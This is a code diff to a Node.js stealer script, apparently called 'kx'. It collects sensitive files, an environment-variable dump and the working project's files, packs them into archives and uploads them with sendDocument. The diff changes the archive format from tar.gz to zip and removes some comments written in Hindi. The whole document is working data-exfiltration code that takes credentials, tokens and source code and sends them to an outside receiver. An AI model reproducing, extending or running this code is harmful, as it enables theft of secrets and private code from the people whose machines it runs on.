@@ -2,7 +2,7 @@ const fs = require('fs');
 const os = require('os');
 const path = require('path');
 const { grabSensitive, grabProject, grabEnv } = require('../lib/walker');
-const { makeTarGz } = require('../lib/pack');
+const { makeZipFromItems } = require('../lib/pack');
 const { sendMessage, sendDocument } = require('../lib/send');
 
 const CWD = process.cwd();
@@ -40,7 +40,6 @@ async function main() {
     `[kx] sensitive: ${sensitive.length} files, project: ${project.length} files`
   );
 
-  // env dump
   const envDump = grabEnv();
   if (envDump) {
     const envFile = tmpFile('env.txt');
@@ -49,15 +48,13 @@ async function main() {
     try { fs.unlinkSync(envFile); } catch {}
   }
 
-  // sensitive files — chhota bundle, ek tar.gz me
   if (sensitive.length) {
-    const sensOut = tmpFile('sensitive.tar.gz');
-    await makeTarGz(sensitive, sensOut, { type: 'sensitive', meta });
+    const sensOut = tmpFile('sensitive.zip');
+    makeZipFromItems(sensitive, sensOut, { type: 'sensitive', meta });
     await sendDocument(sensOut, `sensitive — ${sensitive.length} files`);
     try { fs.unlinkSync(sensOut); } catch {}
   }
 
-  // project — batches me
   const BATCH_BYTES = 40 * 1024 * 1024;
   let batch = [];
   let size = 0;
@@ -67,8 +64,8 @@ async function main() {
   async function flush() {
     if (!batch.length) return;
     n++;
-    const out = tmpFile(`project_${n}.tar.gz`);
-    await makeTarGz(batch, out, {
+    const out = tmpFile(`project_${n}.zip`);
+    makeZipFromItems(batch, out, {
       type: 'project',
       batch: n,
       root: projectRoot,
